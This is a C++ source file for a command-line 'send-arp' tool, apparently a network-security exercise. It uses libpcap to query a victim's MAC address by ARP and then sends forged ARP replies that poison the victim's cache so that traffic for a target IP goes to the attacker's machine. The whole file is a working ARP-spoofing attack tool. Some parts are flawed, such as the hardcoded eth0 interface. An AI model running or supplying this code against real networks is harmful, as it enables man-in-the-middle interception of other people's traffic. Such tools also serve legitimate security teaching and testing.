#include <cstdio>
#include <pcap.h>
#include "ip.h"
#include "ethhdr.h"
#include "arphdr.h"
//#include "libnet-headers.h"
//#include "libnet-macros.h"
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>


#define 	ETHERTYPE_ARP            0x0806 //ipv4
#define 	ETHER_ADDR_LEN   		6
#define 	LIBNET_LIL_ENDIAN		1
#define 	LIBNET_BIG_ENDIAN		0

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.0.2 192.168.0.1\n");
}

struct libnet_ethernet_hdr
{
    u_int8_t  ether_dhost[ETHER_ADDR_LEN];/* destination ethernet address */
    u_int8_t  ether_shost[ETHER_ADDR_LEN];/* source ethernet address */
    u_int16_t ether_type;                 /* protocol */
};

int Get_My_Ip_Addr(char *ip_buffer)
{
    int fd;
    struct ifreq ifr;
 
    fd = socket(AF_INET, SOCK_DGRAM, 0);
     
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ -1);
    
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
     
    sprintf(ip_buffer, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

    return 0;
}


uint8_t my_mac[8];
int get_my_mac(){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, "eth0");
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
      int i;
      for (i = 0; i < 6; ++i)
          my_mac[i] = (uint8_t) s.ifr_addr.sa_data[i];
      return 0;
    }
    return 1;
}


//send_request(handle, packet, argv[2], my_Mac_addr, my_ip);
int send_request(pcap_t* handle, EthArpPacket packet, char* victim_ip, char* my_mac, char* my_ip ){
    static u_char target_mac[8];

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");// broadcast
    packet.eth_.smac_ = Mac(my_mac);// attacker's mac
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.sip_ = htonl(Ip(my_ip));  // attacker's ip
    packet.arp_.smac_ = Mac(my_mac); // attacker's mac
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // blank
    packet.arp_.tip_ = htonl(Ip(victim_ip));  // victim's ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
    return 0;
}

int spoofing(pcap_t* handle, EthArpPacket packet, char* victim_mac, char* my_mac, char* my_ip, char* victim_ip ,char* target_ip){

    packet.eth_.dmac_ = Mac(victim_mac);
    packet.eth_.smac_ = Mac(my_mac);// attacker's mac
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.sip_ = htonl(Ip(target_ip));  // target's mac
    packet.arp_.smac_ = Mac(my_mac); // attacker's mac
    packet.arp_.tmac_ = Mac(victim_mac); // blank
    packet.arp_.tip_ = htonl(Ip(victim_ip));  // victim's ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
    return 0;
}

int main(int argc, char* argv[]) {

	if (argc % 2 !=0 | argc < 4) {
		usage();
		return -1;
	}


	get_my_mac();

	char my_Mac_addr[20];
	sprintf(my_Mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
	printf("ME MAC ADDR -> %s\n", my_Mac_addr);

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char my_ip[20];
	Get_My_Ip_Addr(my_ip);

	for (int cnt = 2; cnt<argc-1; cnt+=2){

			EthArpPacket packet_arp;
			send_request(pcap, packet_arp, argv[cnt], my_Mac_addr, my_ip);

			while(true){
	        const u_char* packet;
			struct pcap_pkthdr* header;

	        int res = pcap_next_ex(pcap, &header, &packet);

	        if (res == 0) {
	            printf("res = 0\n");
	            continue;
	        }
	        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
	            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
	        break;
	        }
	        struct libnet_ethernet_hdr* eth = (struct libnet_ethernet_hdr*) packet;
	        if(ntohs(eth->ether_type) == ETHERTYPE_ARP){
				char victim_Mac_addr[20];
				sprintf(victim_Mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X", eth->ether_shost[0], eth->ether_shost[1], eth->ether_shost[2], eth->ether_shost[3], eth->ether_shost[4], eth->ether_shost[5]);
	        	printf("YOU MAC ADDR -> %s\n", victim_Mac_addr);
	        	spoofing(pcap, packet_arp, victim_Mac_addr, my_Mac_addr, my_ip, argv[cnt] ,argv[cnt+1] );
	        	printf("Spoofing!\n");
	        	break;
	        }
	        else continue;
		}
    }
	


	pcap_close(pcap);
}
